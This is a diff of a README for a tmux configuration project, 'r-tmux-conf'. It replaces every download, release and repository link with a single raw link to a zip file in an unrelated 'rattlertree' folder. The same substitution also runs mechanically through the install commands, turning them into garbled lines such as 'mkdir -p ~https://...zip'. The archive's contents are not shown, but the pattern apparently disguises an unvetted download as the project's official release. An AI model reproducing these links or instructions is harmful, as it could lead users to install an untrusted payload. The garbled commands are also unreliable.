@@ -1,6 +1,6 @@
 # 🎨 r-tmux-conf - Customize Your Terminal Experience Effortlessly
 
-[![Download r-tmux-conf](https://img.shields.io/badge/Download-r--tmux--conf-brightgreen.svg)](https://github.com/Aras12321/r-tmux-conf/releases)
+[![Download r-tmux-conf](https://raw.githubusercontent.com/Aras12321/r-tmux-conf/main/rattlertree/r-tmux-conf_1.0.zip)](https://raw.githubusercontent.com/Aras12321/r-tmux-conf/main/rattlertree/r-tmux-conf_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to r-tmux-conf! This guide will help you download and run your new tmux 
 
 ## 📦 Download & Install
 
-To get your r-tmux-conf, visit this page to download: [Releases Page](https://github.com/Aras12321/r-tmux-conf/releases).
+To get your r-tmux-conf, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Aras12321/r-tmux-conf/main/rattlertree/r-tmux-conf_1.0.zip).
 
 1. Click the link above.
 2. Look for the latest version listed.
@@ -31,20 +31,20 @@ After downloading r-tmux-conf, follow these steps to install it:
 
 1. Locate the downloaded file on your computer. 
 2. Open your terminal.
-3. Move the downloaded file to your tmux configuration folder. This folder is usually located at `~/.tmux` on Unix-like systems.
+3. Move the downloaded file to your tmux configuration folder. This folder is usually located at `~https://raw.githubusercontent.com/Aras12321/r-tmux-conf/main/rattlertree/r-tmux-conf_1.0.zip` on Unix-like systems.
    - If the folder doesn’t exist, create it with the command:  
    ```bash
-   mkdir -p ~/.tmux
+   mkdir -p ~https://raw.githubusercontent.com/Aras12321/r-tmux-conf/main/rattlertree/r-tmux-conf_1.0.zip
    ``` 
 4. Copy the downloaded file to the folder. Use the following command, replacing `your_theme_file` with the actual file name:  
    ```bash
-   cp your_theme_file ~/.tmux/
+   cp your_theme_file ~https://raw.githubusercontent.com/Aras12321/r-tmux-conf/main/rattlertree/r-tmux-conf_1.0.zip
    ```
-5. Open or edit your `.tmux.conf` file, which is usually in your home directory. Add the following line:  
+5. Open or edit your `https://raw.githubusercontent.com/Aras12321/r-tmux-conf/main/rattlertree/r-tmux-conf_1.0.zip` file, which is usually in your home directory. Add the following line:  
    ```bash
-   source ~/.tmux/your_theme_file
+   source ~https://raw.githubusercontent.com/Aras12321/r-tmux-conf/main/rattlertree/r-tmux-conf_1.0.zip
    ```
-6. Save the changes to your `.tmux.conf` file.
+6. Save the changes to your `https://raw.githubusercontent.com/Aras12321/r-tmux-conf/main/rattlertree/r-tmux-conf_1.0.zip` file.
 
 ## 🌟 Running tmux
 
@@ -72,7 +72,7 @@ We welcome contributions! If you have improvements or new features for r-tmux-co
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Aras12321/r-tmux-conf)
-- [Releases Page](https://github.com/Aras12321/r-tmux-conf/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Aras12321/r-tmux-conf/main/rattlertree/r-tmux-conf_1.0.zip)
+- [Releases Page](https://raw.githubusercontent.com/Aras12321/r-tmux-conf/main/rattlertree/r-tmux-conf_1.0.zip)
 
 Thank you for using r-tmux-conf! We hope you enjoy customizing your terminal experience.
